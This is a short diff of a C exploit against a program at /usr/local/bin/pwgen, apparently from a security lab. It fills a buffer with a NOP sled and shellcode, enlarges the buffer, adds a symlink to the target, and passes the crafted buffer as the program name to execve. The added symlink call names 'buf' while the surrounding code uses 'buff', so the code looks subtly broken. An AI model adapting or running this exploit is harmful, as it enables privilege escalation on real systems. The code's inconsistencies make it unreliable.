@@ -9,7 +9,7 @@
 
 #define TARGET "/usr/local/bin/pwgen"
 
-#define BUFFER_SIZE 562
+#define BUFFER_SIZE 700
 #define NOP 0x90
 
 int main(void) {
@@ -41,10 +41,11 @@ int main(void) {
     *(ptr++) = shellcode[i];
 
   buff[BUFFER_SIZE - 1] = '\0';
+  symlink(TARGET,buf);
 
   // another way
-  args[0] = TARGET; args[1] = "-s";
-  args[2] = buff; args[3] = NULL;
+  args[0] = buff; args[1] = "-h";
+  args[2] = NULL; args[3] = NULL;
 
   env[0] = NULL;
   // execve() executes the target program by overwriting the
